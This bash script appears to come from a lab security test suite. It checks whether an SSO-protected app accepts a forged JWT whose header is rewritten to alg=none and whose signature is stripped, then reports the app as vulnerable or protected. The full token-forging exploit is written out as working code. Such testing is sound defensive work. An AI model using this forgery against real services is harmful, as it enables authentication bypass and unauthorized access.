#!/usr/bin/env bash
# A1 — JWT Algorithm Confusion (alg=none)
# OWASP ASVS v4.2 § 3.5.3 — Verify JWTs specify the allowed algorithms.
# CVE-2015-9235 / RFC 7519 §10.7
#
# Profiles: 1A, 1C
#
# Replaces the JWT header's "alg" with "none", removes the signature,
# and sends the forged token to the protected endpoint.
# A vulnerable server accepts the token without verifying the algorithm.
#
# Usage:
#   bash A1_jwt_alg_none.sh <app_url> <idp_url> [realm] [client_id] [client_secret] [username] [password]
#
# Examples:
#   bash A1_jwt_alg_none.sh https://app.sso-lab.local https://idp.sso-lab.local
#   bash A1_jwt_alg_none.sh https://app.sso-lab.local https://idp.sso-lab.local sso-lab sso-test-app testpass123 testuser password123

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

APP_URL="${1:?Usage: $0 <app_url> <idp_url> [realm] [client_id] [client_secret] [username] [password]}"
IDP_URL="${2:?}"
REALM="${3:-sso-lab}"
CLIENT_ID="${4:-sso-test-app}"
CLIENT_SECRET="${5:-testpass123}"
USERNAME="${6:-testuser}"
PASSWORD="${7:-password123}"

echo "[A1] JWT Algorithm Confusion — alg=none"
echo "     App: $APP_URL  |  IdP: $IDP_URL  |  Realm: $REALM"
echo

# ── Step 1: Obtain a valid id_token ───────────────────────────────────────────
echo "  [1] Obtaining valid id_token via ROPC..."
TOKEN=$(get_id_token "$IDP_URL" "$REALM" "$CLIENT_ID" "$CLIENT_SECRET" "$USERNAME" "$PASSWORD")

if [[ -z "$TOKEN" ]]; then
  echo "      FAILED — could not obtain id_token (is Keycloak running?)"
  echo
  echo "SKIPPED — no token to forge"
  exit 0
fi
echo "      Got token: ${TOKEN:0:40}…"
echo

# ── Step 2: Decode and display original header/payload ────────────────────────
IFS='.' read -r header_b64 payload_b64 sig_b64 <<< "$TOKEN"

HEADER_JSON=$(b64url_decode "$header_b64")
PAYLOAD_JSON=$(b64url_decode "$payload_b64")

echo "  [2] Original JWT:"
echo "      Header:  $HEADER_JSON"
echo "      Payload: $(echo "$PAYLOAD_JSON" | python3 -c 'import sys,json; print(json.dumps(json.load(sys.stdin),indent=2))' 2>/dev/null || echo "$PAYLOAD_JSON")"
echo

# ── Step 3: Forge a token with alg=none ───────────────────────────────────────
FORGED_HEADER_B64=$(b64url_encode '{"alg":"none","typ":"JWT"}')
FORGED_TOKEN="${FORGED_HEADER_B64}.${payload_b64}."

echo "  [3] Forged token (alg=none, empty signature):"
echo "      ${FORGED_TOKEN:0:80}…"
echo

# ── Step 4: Test with original valid token first (baseline) ──────────────────
STATUS_VALID=$(rcurl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  "${APP_URL%/}/protected" 2>/dev/null || echo "000")

echo "  [4] Baseline — valid token → HTTP $STATUS_VALID"

if [[ "$STATUS_VALID" != "200" ]]; then
  echo "      WARNING: valid token not accepted (HTTP $STATUS_VALID). Endpoint may differ."
fi

# ── Step 5: Send forged token ────────────────────────────────────────────────
RESP_FILE="/tmp/a1_response_$$.txt"
STATUS_FORGED=$(rcurl -sk -o "$RESP_FILE" -w "%{http_code}" \
  -H "Authorization: Bearer $FORGED_TOKEN" \
  "${APP_URL%/}/protected" 2>/dev/null || echo "000")

BODY_PREVIEW=$(head -c 200 "$RESP_FILE" 2>/dev/null || true)
rm -f "$RESP_FILE"

echo "  [5] Forged   — alg=none token → HTTP $STATUS_FORGED"
[[ -n "$BODY_PREVIEW" ]] && echo "      Response: $BODY_PREVIEW"
echo

# ── Verdict ──────────────────────────────────────────────────────────────────
if [[ "$STATUS_FORGED" == "200" ]]; then
  echo "VULNERABLE — server accepted a JWT with alg=none (no signature verification)"
else
  echo "PROTECTED  — server rejected the alg=none token (HTTP $STATUS_FORGED)"
fi
